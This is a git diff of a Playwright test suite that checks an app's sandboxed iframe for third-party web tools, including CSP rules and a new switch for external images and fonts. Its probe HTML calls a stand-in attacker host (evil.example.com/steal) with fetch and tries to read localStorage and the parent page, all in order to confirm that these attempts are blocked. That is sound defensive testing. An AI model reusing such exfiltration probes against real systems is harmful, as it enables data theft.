@@ -18,6 +18,8 @@
 //   十二、番外生成器：本地编译不调接口，标签按语义词典翻译；在「我们」中建一则番外
 //   十三、「联系」的关联角色页：「更多设置」跳到 NPC 生成器并带上那个角色
 //   十四、盒子的外壳：CSP 在文档最前面、不许连外网；主屏自定义组件也用同一个盒子
+//   十五、外部图片与字体（用户要求「要有可以打开外部图片的」「字体也要」）：网页工具默认可以用，开关关掉就不行；
+//        开着时往里交角色之前提醒一句；主屏组件一律可以；编辑工具时开着的运行页不会被误判成「跳走」
 import { BASE, EXE, chromium } from './_env.mjs';
 
 const browser = await chromium.launch({ executablePath: EXE, args: ['--no-sandbox'] });
@@ -39,8 +41,14 @@ await ctx.route(/https:\/\/main\.example\.com\//, async route => {
   return route.fulfill({ status: 200, contentType: 'application/json',
     body: JSON.stringify({ choices: [{ message: { role: 'assistant', content: reply } }] }) });
 });
-const evil = [];
-await ctx.route(/evil\.example\.com/, route => { evil.push(route.request().url()); route.fulfill({ status: 200, body: 'x' }); });
+// 数的是「真的往网络发出的请求」。被 CSP 拦下的请求 playwright 也会先报一个 request 事件，
+// 随后以 ERR_BLOCKED_BY_CSP 失败，从来没到网络 —— 这种不算。沙盒里的请求不一定经过 route
+// （可能直接出网失败），所以不靠 route 数
+const evilReq = new Map();
+ctx.on('request', r => { if (/evil\.example\.com/.test(r.url())) evilReq.set(r, r.url()); });
+ctx.on('requestfailed', r => { if (/BLOCKED_BY_CSP|csp/i.test(r.failure()?.errorText || '')) evilReq.delete(r); });
+const evil = { some: fn => [...evilReq.values()].some(fn), join: sep => [...evilReq.values()].join(sep) };
+await ctx.route(/evil\.example\.com/, route => route.fulfill({ status: 200, body: 'x' }));
 
 const page = await ctx.newPage();
 const errs = []; page.on('pageerror', e => errs.push(e.message));
@@ -79,15 +87,17 @@ ok('首页：五个内置工具都在', ['NPC 生成器', '世界观生成器', 
 ok('首页：「我的工具」为空时给出添加入口', t.includes('我的工具') && t.includes('添加工具'));
 
 // ---- 二、盒子 ----
-const PROBE = `<!DOCTYPE html><html><head><title>探针</title></head><body><p>probe</p><script>
+const PROBE = `<!DOCTYPE html><html><head><title>探针</title>
+<script>window.blocked = []; document.addEventListener('securitypolicyviolation', e => blocked.push(e.effectiveDirective + ' ' + e.blockedURI));</script>
+<style>@font-face { font-family: on; src: url(https://evil.example.com/on.woff2); } p { font-family: on; }</style>
+</head><body><p>probe 字</p><img src="https://evil.example.com/pixel.png" alt=""><script>
 const out = {};
 try { localStorage.getItem('x'); out.ls = 'readable'; } catch (e) { out.ls = 'blocked'; }
 try { out.parent = parent.document ? 'readable' : 'none'; } catch (e) { out.parent = 'blocked'; }
 out.eira = typeof window.eira;
 fetch('https://evil.example.com/steal?d=1').then(() => { out.fetch = 'sent'; }).catch(() => { out.fetch = 'blocked'; }).finally(() => {
-  const img = new Image(); img.src = 'https://evil.example.com/pixel.png';
   eira.ai('hi').then(v => { out.ai = 'ok:' + v; }).catch(e => { out.ai = 'err:' + e.message; })
-    .finally(() => parent.postMessage({ probe: out }, '*'));
+    .finally(() => setTimeout(() => { out.blocked = blocked; parent.postMessage({ probe: out }, '*'); }, 1500));
 });
 </script></body></html>`;
 const webId = await ev(async html => (await import('/src/system/toolbox.js')).create({ kind: 'web', name: '探针', html }).id, PROBE);
@@ -99,7 +109,12 @@ ok('盒子：碰不到外层页面', p.parent === 'blocked', JSON.stringify(p));
 ok('盒子：window.eira 在', p.eira === 'object', JSON.stringify(p));
 ok('盒子：连不上外网（fetch 被拦）', p.fetch === 'blocked', JSON.stringify(p));
 await wait(300);
-ok('盒子：外部请求一次都没有发出去（连图片也没有）', evil.length === 0, evil.join(','));
+// 放行与否看 iframe 自己收到的 CSP 违规报告：被拦的一定报，没报的就是放行了。
+// 不靠数网络请求 —— 沙盒 iframe 在单独的进程里，它的请求 playwright 不一定报得出来
+ok('盒子：fetch 被 CSP 拦下（connect-src）', (p.blocked || []).some(x => /^connect-src .*steal/.test(x)), JSON.stringify(p.blocked));
+ok('盒子：fetch 一次都没有到网络', !evil.some(u => u.includes('steal')), evil.join(','));
+ok('外部图片：默认可以加载（没有被 CSP 拦）', !(p.blocked || []).some(x => /pixel\.png/.test(x)), JSON.stringify(p.blocked));
+ok('外部字体：默认可以加载（没有被 CSP 拦）', !(p.blocked || []).some(x => /on\.woff2/.test(x)), JSON.stringify(p.blocked));
 ok('没开「允许调用接口」：请求被拒，一次都没发', /未获准/.test(p.ai || '') && hits.length === 0, `${p.ai} hits=${hits.length}`);
 t = await body();
 ok('顶栏写明第三方工具、无法读取应用数据与联网', t.includes('第三方工具') && t.includes('无法联网'));
@@ -183,6 +198,7 @@ await clearProbes();
 const nChars = await ev(async () => (await import('/src/system/db/index.js')).characters.count());
 await push(`/t/${psId}`);
 ok('pick：弹出选角色的面板', await until(async () => (await page.locator('.sheet').innerText().catch(() => '')).includes('交给「选与存」一个角色')));
+ok('pick：开着外部图片与字体，交之前提醒内容可能随这些地址发出', (await page.locator('.sheet').innerText()).includes('随这些地址发出'));
 await page.locator('.sheet .list-item', { hasText: '阿岚' }).click();
 ok('save：先出确认页，内容给用户看', await until(async () => (await page.locator('.sheet').innerText().catch(() => '')).includes('新来的人')));
 ok('确认之前没有存', await ev(async () => (await import('/src/system/db/index.js')).characters.count()) === nChars);
@@ -365,7 +381,35 @@ const w = await ev(async () => {
 ok('盒子：CSP 在文档最前面，排在它自己的脚本之前', w.csp > 0 && w.csp < w.script && w.head.startsWith('<!DOCTYPE html><meta http-equiv="Content-Security-Policy"'), JSON.stringify(w));
 ok('盒子：不给 allow-same-origin，不许连外网', w.sandbox === 'allow-scripts' && w.connect);
 const widgetSrc = await ev(async () => (await fetch('/src/screens/home/widgets.js')).text());
-ok('主屏自定义组件：用同一个盒子（srcdoc + CSP），不再直接 src 一个文件', /srcdoc=\$\{wrap\(text\)\}/.test(widgetSrc) && !/src=\$\{url\} sandbox/.test(widgetSrc));
+ok('主屏自定义组件：用同一个盒子（srcdoc + CSP），不再直接 src 一个文件', /srcdoc=\$\{wrap\(text/.test(widgetSrc) && !/src=\$\{url\} sandbox/.test(widgetSrc));
+
+ok('主屏自定义组件：外部图片与字体可以用', /wrap\(text, \{ images: true \}\)/.test(widgetSrc));
+
+// ---- 十五、外部图片的开关 ----
+await go('/');
+await wait(300);
+const IMG = '<script>window.blocked = []; document.addEventListener("securitypolicyviolation", e => blocked.push(e.effectiveDirective + " " + e.blockedURI));</script><style>@font-face{font-family:x;src:url(https://evil.example.com/off.woff2)}p{font-family:x}</style><link rel="stylesheet" href="https://evil.example.com/off.css"><p>字</p><img src="https://evil.example.com/off.png"><script>setTimeout(() => parent.postMessage({ probe: { img: 1, blocked } }, "*"), 1500);</script>';
+const imgId = await ev(async html => (await import('/src/system/toolbox.js')).create({ kind: 'web', name: '图片', html, allowImages: false }).id, IMG);
+await clearProbes();
+await push(`/t/${imgId}`);
+await until(async () => (await probes()).length > 0);
+const offBlocked = ((await probes())[0] || {}).blocked || [];
+ok('关掉开关：外部图片、字体、样式表都被 CSP 拦下', ['img-src', 'style-src', 'font-src'].every(d => offBlocked.some(x => x.startsWith(d)))
+  || (offBlocked.some(x => /off\.png/.test(x)) && offBlocked.some(x => /off\.css/.test(x))), JSON.stringify(offBlocked));
+ok('关掉开关：一个都没有到网络', !evil.some(u => /off\.(png|woff2|css)/.test(u)), evil.join(','));
+ok('关掉之后顶栏写「无法联网」', (await body()).includes('无法联网') && !(await body()).includes('除外部图片'));
+const csp = await ev(async () => {
+  const sb = await import('/src/system/sandbox.js');
+  return { on: sb.cspOf({ images: true }), off: sb.cspOf({ images: false }) };
+});
+ok('开着时只多放开 https 图片、字体与样式表，脚本与网络请求不变', /img-src data: blob: https:/.test(csp.on)
+  && /font-src data: https:/.test(csp.on) && /style-src 'unsafe-inline' https:/.test(csp.on) && !/https:/.test(csp.off)
+  && csp.on.replace(/ https:/g, '') === csp.off && /connect-src 'none'/.test(csp.on) && /script-src 'unsafe-inline' 'unsafe-eval'(;|$)/.test(csp.on), JSON.stringify(csp));
+// 运行页开着时去编辑（开关、HTML），回来不应被当成「跳走」
+await ev(async id => (await import('/src/system/toolbox.js')).update(id, { allowImages: true, html: '<p>新的一版</p>' }), imgId);
+await wait(900);
+t = await body();
+ok('编辑了开着的工具：换成新的一版，不误判为跳走', !t.includes('试图打开外部网页') && await page.locator('.tb-frame').count() === 1, t.slice(0, 200));
 
 ok('没有页面错误', errs.length === 0, errs.join(' | '));
 await browser.close();
